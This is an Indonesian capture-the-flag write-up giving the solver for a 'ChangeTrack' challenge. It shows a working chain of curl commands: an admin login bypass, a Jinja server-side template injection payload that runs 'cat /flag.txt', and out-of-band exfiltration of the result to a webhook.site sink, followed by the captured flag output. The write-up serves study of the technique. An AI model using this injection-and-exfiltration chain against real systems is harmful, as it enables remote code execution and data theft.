# ChangeTrack — Eksploitasi / Solver

[← Overview](48-changetrack.md) · [Index](index.md)

### 3.1 Strategi

- Login ke workspace admin.
- Ubah manifest watcher agar template mengeksekusi `cat /flag.txt`.
- Arahkan `webhook_url` ke sink eksternal yang bisa dibaca (webhook.site).
- Picu dispatch dan polling capture.

### 3.2 Langkah exploit (live)

1. Login:

```bash
BASE=http://s1.nfx.my.id:40359
curl -sS -c cj -X POST \
  -d 'email=admin@changetrack.local&password=anything' "$BASE/login"
# HTTP 302 /dashboard
```

2. Siapkan sink webhook.site:

```bash
curl -sS -X POST https://webhook.site/token \
  -H 'Content-Type: application/json' -d '{}'
# simpan uuid
```

3. Simpan manifest SSTI (via form):

```bash
UUID=8509b71c-b1c7-4a12-baf7-26428e5b36a1
cat > manifest.yaml <<EOF
watcher:
  name: GitHub Release Price Tracker
  target_url: https://api.github.com/zen
  check_interval: 300
notification:
  webhook_url: https://webhook.site/$UUID
  format: yaml
  template: |
    FLAG1
    {{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
EOF

curl -sS -b cj --data-urlencode 'name=GitHub Release Price Tracker' \
  --data-urlencode 'target_url=https://api.github.com/zen' \
  --data-urlencode 'yaml_manifest@manifest.yaml' \
  "$BASE/watchers/watch-01/edit"
# HTTP 302 /watchers/watch-01
```

4. Picu dispatch:

```bash
curl -sS -b cj -X POST "$BASE/watchers/watch-01/test"
# HTTP 302
```

5. Baca capture:

```bash
curl -sS "https://webhook.site/token/$UUID/requests?sorting=newest"
```

Script lengkap: `assets/changetrack/exploit_changetrack.py`.

### 3.3 Output asli

Benign SSTI:

```text
HELLO_WEBHOOK_SITE 49
target=https://api.github.com/events
```

RCE / flag:

```text
########## FLAG1: cat /flag.txt  (captures=2)
FLAG1
NFX{ch4ng3_d3t3ct10n_j1nj4_sst1_oob_cve_2024_32651_2026}
```

Capture JSON:

```text
HTTP 200
{
  "uuid": "25852c30-ba6f-464b-9ce6-4b2596fdbd33",
  "created_at": "2026-11-08 01:26:06",
  "ip": "116.212.75.209",
  "method": "POST",
  "url": "https://webhook.site/8509b71c-b1c7-4a12-baf7-26428e5b36a1",
  "content": "FLAG1\nNFX{ch4ng3_d3t3ct10n_j1nj4_sst1_oob_cve_2024_32651_2026}\n"
}
```
